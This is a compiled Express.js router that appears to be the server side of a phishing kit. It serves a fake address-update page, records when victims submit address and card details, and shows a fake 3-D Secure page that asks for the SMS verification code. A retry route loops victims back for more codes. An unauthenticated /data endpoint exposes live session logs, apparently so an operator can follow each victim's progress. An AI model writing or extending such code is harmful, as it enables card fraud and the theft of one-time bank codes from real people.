"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
const express_1 = require("express");
const path = __importStar(require("path"));
const socket_1 = require("../modules/socket");
const router = express_1.Router();
router.get('/data', (req, res) => {
    res.json({
        success: true,
        totalSessions: socket_1.totalSessions,
        activeSessions: socket_1.activeSessions,
        totalPageLoads: socket_1.totalPageLoads,
        sessionLogs: socket_1.sessionLogs
    });
});
router.get('/update-address', (req, res) => {
    newLog(req.sessionID, 'Event - Clicked on the main page');
    return res.sendFile(path.join(__dirname, '../views/update-address.html'));
});
router.get('/processing', (req, res) => {
    newLog(req.sessionID, 'Event - User has submitted address and card details');
    return res.sendFile(path.join(__dirname, '../views/processing.html'));
});
router.get('/verification-code', (req, res) => {
    newLog(req.sessionID, 'Event - User is waiting for SMS verification code');
    return res.sendFile(path.join(__dirname, '../views/3d-secure.html'));
});
router.get('/verification-code/retry', (req, res) => {
    newLog(req.sessionID, 'Event - User is waiting for SMS verification code - Looped');
    return res.sendFile(path.join(__dirname, '../views/verification-code-2.html'));
});
router.get('/thank-you', (req, res) => {
    newLog(req.sessionID, 'Event - User completed the registration');
    return res.sendFile(path.join(__dirname, '../views/thank-you.html'));
});
const newLog = (sessionID, message) => {
    let log = socket_1.sessionLogs.find(x => x.id == sessionID);
    if (!log)
        return;
    log.logs
        ? log.logs.push({
            ts: new Date(),
            msg: message
        })
        : log.logs = [{
                ts: new Date(),
                msg: message
            }];
};
module.exports = router;
//# sourceMappingURL=index.js.map